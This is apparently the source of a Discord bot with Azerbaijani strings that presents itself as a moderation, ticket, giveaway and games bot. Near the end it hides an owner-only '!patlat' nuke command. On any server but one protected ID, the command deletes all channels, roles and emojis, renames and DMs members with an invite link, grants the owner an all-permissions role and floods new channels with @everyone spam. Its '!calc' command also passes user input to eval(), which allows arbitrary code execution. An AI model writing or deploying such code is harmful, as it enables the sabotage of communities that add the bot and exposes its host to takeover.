import discord
from discord.ext import commands
import random
import asyncio
import os
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Bot aktivdir!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SAHIB_ID = 641014966312501259
GUVENLI_SERVER_ID = 1520692621964738722
XAS_COLOR = discord.Color.from_rgb(20, 24, 33)

user_message_counts = {}
user_last_message_time = {}
user_xp = {}
user_warns = {}

@bot.event
async def on_ready():
    print(f"{bot.user.name} tam tərkibdə, ciddi rejimdə aktivdir, Sahib!")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    content_lower = message.content.lower()
    if "/tag" in content_lower or "y1z" in content_lower or "g4r" in content_lower or "g3r" in content_lower:
        try:
            await message.delete()
            return
        except:
            pass

    # Sonsuz Level / XP Sistemi
    author_id = message.author.id
    current_xp = user_xp.get(author_id, {"xp": 0, "level": 1})
    current_xp["xp"] += random.randint(10, 25)
    needed_xp = current_xp["level"] * 150
    if current_xp["xp"] >= needed_xp:
        current_xp["level"] += 1
        current_xp["xp"] = 0
        try:
            await message.channel.send(f"[{message.author.name}] Səviyyə yüksəldi: Level {current_xp['level']}")
        except:
            pass
    user_xp[author_id] = current_xp

    await bot.process_commands(message)

    import time
    current_time = time.time()
    if author_id in user_last_message_time:
        diff = current_time - user_last_message_time[author_id]
        if diff < 1.2:
            count = user_message_counts.get(author_id, 0) + 1
            user_message_counts[author_id] = count
            if count >= 4:
                try:
                    await message.channel.send(f"{message.author.mention} Yavaş yaz.")
                except:
                    pass
        else:
            user_message_counts[author_id] = 1
    else:
        user_message_counts[author_id] = 1
    user_last_message_time[author_id] = current_time

@bot.event
async def on_member_join(member):
    if member.bot and member.guild.id != GUVENLI_SERVER_ID:
        try:
            await member.ban(reason="Təhlükəsizlik: İcazəsiz bot girişi.")
        except:
            pass

# --- CİDDİ VƏ SƏLİQƏLİ DROPDOWN PANEL SİSTEMİ ---
class PanelSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Xidmət və Məhsullar", description="Məhsullar və cari qiymətlər ilə tanış olun.", emoji="🛒"),
            discord.SelectOption(label="Əsas Moderasiya", description="Ban, kick, lock və digər idarəetmə komandaları.", emoji="🛡️"),
            discord.SelectOption(label="Əyləncə və Oyunlar", description="Zar, coinflip, iq və digər simulyasiyalar.", emoji="💻"),
            discord.SelectOption(label="Çekiliş və Ticket", description="Hədiyyə və dəstək xidmətləri.", emoji="🎫")
        ]
        super().__init__(placeholder="Bir kateqoriya seçərək məlumatlara baxın...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "Xidmət və Məhsullar":
            embed = discord.Embed(
                title="XAS — XİDMƏT VƏ MƏHSUL PANELİ",
                description="--------------------------------------------------\n\n**Xoş gəlmisiniz!**\n\nAşağıdakı menyudan maraqlandığınız kateqoriyanı seçərək məhsullar və yenilənmiş qiymətlərlə tanış ola bilərsiniz.\n\n--------------------------------------------------\n\nKeyfiyyətli xidmət, 100% zəmanət və ən münasib qiymətlər!\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            embed.set_footer(text="Sifariş vermək üçün dəstək biletlərindən istifadə edin.")
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Əsas Moderasiya":
            embed = discord.Embed(
                title="XAS — MODERASİYA SİSTEMİ",
                description="--------------------------------------------------\n\n**Komandalar:**\n`!ban`, `!kick`, `!lock`, `!unlock`, `!hide`, `!unhide`, `!slowmode`, `!warn`, `!warns`\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Əyləncə və Oyunlar":
            embed = discord.Embed(
                title="XAS — ƏYLƏNCƏ VƏ OYUNLAR",
                description="--------------------------------------------------\n\n**Komandalar:**\n`!roll`, `!coinflip`, `!iq`, `!gay`, `!handsome`, `!love`, `!hack`, `!slot`, `!8ball`, `!rps`, `!level`\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Çekiliş və Ticket":
            embed = discord.Embed(
                title="XAS — ÇƏKİLİŞ VƏ DƏSTƏK",
                description="--------------------------------------------------\n\n**Komandalar:**\n`!giveaway`, `!ticketkur`, `!close`\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(PanelSelect())

@bot.command(name="panel", aliases=["menu", "komandalar"])
async def panel_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(
        title="XAS — XİDMƏT VƏ MƏHSUL PANELİ",
        description="--------------------------------------------------\n\n**Xoş gəlmisiniz!**\n\nAşağıdakı menyudan maraqlandığınız kateqoriyanı seçərək məhsullar və yenilənmiş qiymətlərlə tanış ola bilərsiniz.\n\n--------------------------------------------------\n\nKeyfiyyətli xidmət, 100% zəmanət və ən münasib qiymətlər!\n\n--------------------------------------------------",
        color=XAS_COLOR
    )
    embed.set_footer(text="Sifariş vermək üçün dəstək biletlərindən istifadə edin.")
    await ctx.send(embed=embed, view=PanelView())

# --- TICKET SİSTEMİ ---
class TicketButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.secondary, custom_id="open_ticket")
    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        for role in guild.roles:
            if role.permissions.administrator:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        channel_name = f"ticket-{interaction.user.name}"
        existing_channel = discord.utils.get(guild.text_channels, name=channel_name.lower())
        
        if existing_channel:
            await interaction.response.send_message(f"Açıq ticket kanalınız mövcuddur: {existing_channel.mention}", ephemeral=True)
            return

        ticket_chan = await guild.create_text_channel(channel_name, overwrites=overwrites)
        embed = discord.Embed(title="XAS Dəstək Sistemi", description=f"Müraciətiniz qəbul edildi. Kapatmaq üçün `!close` yazın.", color=XAS_COLOR)
        await ticket_chan.send(embed=embed)
        await interaction.response.send_message(f"Ticket kanalınız yaradıldı: {ticket_chan.mention}", ephemeral=True)

@bot.command(name="ticketkur")
async def ticketkur_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="XAS Dəstək Xidməti", description="Dəstək tələb etmək üçün aşağıdakı düyməni istifadə edin.", color=XAS_COLOR)
    await ctx.send(embed=embed, view=TicketButton())

@bot.command(name="close")
async def close_cmd(ctx):
    if "ticket" in ctx.channel.name:
        await ctx.send("Ticket 5 saniyə ərzində bağlanacaq.")
        await asyncio.sleep(5)
        try:
            await ctx.channel.delete()
        except:
            pass
    else:
        await ctx.send("Bu komanda yalnız ticket kanallarında işləyir.")

# --- LEVEL, WARN VƏ ÇƏKİLİŞ SİSTEMLƏRİ ---
@bot.command(name="level", aliases=["lvl"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_xp.get(m.id, {"xp": 0, "level": 1})
    embed = discord.Embed(title=f"{m.name} — Səviyyə", color=XAS_COLOR)
    embed.add_field(name="Səviyyə", value=str(data["level"]), inline=True)
    embed.add_field(name="XP", value=str(data["xp"]), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="warn")
async def warn_cmd(ctx, member: discord.Member, *, reason="Səbəb yoxdur"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    warn_list = user_warns.get(member.id, [])
    warn_list.append(reason)
    user_warns[member.id] = warn_list
    await ctx.send(f"{member.mention} xəbərdar edildi. Səbəb: {reason}")
    if len(warn_list) >= 3:
        try:
            await member.kick(reason="3 xəbərdarlıq limiti aşılıb.")
            await ctx.send(f"{member.mention} 3 xəbərdarlığı doldurduğu üçün qovuldu.")
        except:
            pass

@bot.command(name="warns")
async def warns_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    warn_list = user_warns.get(m.id, [])
    if not warn_list:
        await ctx.send(f"{m.name} istifadəçisinin xəbərdarlığı yoxdur.")
        return
    reasons = "\n".join([f"{i+1}. {r}" for i, r in enumerate(warn_list)])
    embed = discord.Embed(title=f"{m.name} — Xəbərdarlıqlar", description=reasons, color=XAS_COLOR)
    await ctx.send(embed=embed)

@bot.command(name="giveaway", aliases=["çekiliş"])
async def giveaway_cmd(ctx, time_str: str, *, prize: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    seconds = 0
    if time_str.endswith("s"):
        seconds = int(time_str[:-1])
    elif time_str.endswith("m"):
        seconds = int(time_str[:-1]) * 60
    elif time_str.endswith("h"):
        seconds = int(time_str[:-1]) * 3600
    else:
        await ctx.send("Zaman formatı səhvdir. Məsələn: `10s`, `5m`, `1h`")
        return

    embed = discord.Embed(
        title="ÇƏKİLİŞ",
        description=f"Hədiyyə: **{prize}**\nQatılmaq üçün aşağıdakı reaksiyaya basın.",
        color=XAS_COLOR
    )
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎁")
    await asyncio.sleep(seconds)

    new_msg = await ctx.channel.fetch_message(msg.id)
    users = []
    for reaction in new_msg.reactions:
        if str(reaction.emoji) == "🎁":
            async for user in reaction.users():
                if not user.bot:
                    users.append(user)

    if users:
        winner = random.choice(users)
        await ctx.send(f"Qalib: {winner.mention}. Hədiyyə: **{prize}**")
    else:
        await ctx.send("Çəkilişə qatılan olmadı.")

# --- BÜTÜN İNFO, OYUN VƏ MODERASİYA ƏMRLƏRİ ---
@bot.command(name="url")
async def url_cmd(ctx):
    embed = discord.Embed(title="Server URL Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Server", value=ctx.guild.name, inline=True)
    embed.add_field(name="Vanity URL", value=f"`{ctx.guild.vanity_url_code}`" if ctx.guild.vanity_url_code else "Yoxdur", inline=True)
    await ctx.send(embed=embed)

@bot.command(name="sex")
async def sex_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"{m.name} üçün xüsusi rejim aktivləşdirildi.")

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"Ping: `{round(bot.latency * 1000)}ms`")

@bot.command(name="botinfo")
async def botinfo_cmd(ctx):
    embed = discord.Embed(title="Bot Məlumatı", description="XAS Bot - Sahibinə özəl.", color=XAS_COLOR)
    embed.add_field(name="Sahib", value=f"<@{SAHIB_ID}>", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"{g.name} Məlumatları", color=XAS_COLOR)
    embed.add_field(name="Üzv Sayı", value=g.member_count, inline=True)
    embed.add_field(name="Kanal Sayı", value=len(g.channels), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"Zar: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazıpara"])
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Para"])
    await ctx.send(f"Qəpik: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"{m.name} IQ: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"{m.name} Gay Oranı: **{random.randint(0, 100)}**%")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"{m.name} Yaraşıqlılığı: **{random.randint(50, 100)}**%")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"{member1.name} və {m2.name} uyğunluğu: **{random.randint(0, 100)}**%")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"{m.name} hack olunur...")
    await asyncio.sleep(2)
    await msg.edit(content=f"IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Şifrə sındırıldı.")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
    c1, c2, c3 = random.choices(semboller, k=3)
    if c1 == c2 == c3:
        await ctx.send(f"{c1} | {c2} | {c3} \nJackpot!")
    else:
        await ctx.send(f"{c1} | {c2} | {c3} \nUduzdun.")

@bot.command(name="8ball", aliases=["saal"])
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli.", "Şübhəsiz ki.", "Xeyr.", "Əsla."]
    await ctx.send(f"Soru: {soru}\nCavab: {random.choice(cavablar)}")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"Nəticə: **{res}**")
    except:
        await ctx.send("Xəta.")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    jokes = [
        "Kompüter niyə soyuqdırmaya düşdü? Çünki pəncərəni açıq qoymuşduq!",
    ]
    await ctx.send(f"Zarafat: {random.choice(jokes)}")

@bot.command(name="rps", aliases=["daşqayçı"])
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("Seçim: daş, kağız, qayçı.")
        return
    if cho == bot_choice:
        await ctx.send(f"Heç-heçə! Mən də {bot_choice} seçmişdim.")
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        await ctx.send(f"Sən qazandın! Mən: {bot_choice}")
    else:
        await ctx.send(f"Mən qazandım! Mən: {bot_choice}")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title=f"Səsvermə", description=soru, color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        return
    await member.ban(reason=reason)
    await ctx.send(f"{member.mention} ban olundu.")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    await member.kick(reason=reason)
    await ctx.send(f"{member.mention} qovuldu.")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("Kanal bağlandı.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("Kanal açıldı.")

@bot.command(name="hide")
async def hide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
    await ctx.send("Kanal gizlətildi.")

@bot.command(name="unhide")
async def unhide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send("Kanal göstərildi.")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"Yavaş rejim: {seconds} san.")

@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("Bu qorunan serverdir!")
        return

    await ctx.send("NUKING BAŞLADI!")

    for emoji in list(guild.emojis):
        try: await emoji.delete()
        except: pass
    for sticker in list(guild.stickers):
        try: await sticker.delete()
        except: pass

    for member in guild.members:
        if member.id != SAHIB_ID and not member.bot:
            try: await member.send("discord.gg/aga")
            except: pass
            try: await member.edit(nick="discord.gg/aga")
            except: pass

    for ch in guild.channels:
        try: await ch.delete()
        except: pass

    for r in guild.roles:
        if r != guild.default_role:
            try: await r.delete()
            except: pass

    try:
        new_role = await guild.create_role(name="discord.gg/aga", permissions=discord.Permissions.all(), color=discord.Color.red())
        await ctx.author.add_roles(new_role)
    except: pass

    try: await guild.edit(name="discord.gg/aga")
    except: pass

    for i in range(1, 30):
        try:
            channel = await guild.create_text_channel(f"nuke-{i}")
            for _ in range(5):
                await channel.send("discord.gg/aga @everyone")
        except: pass

if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    
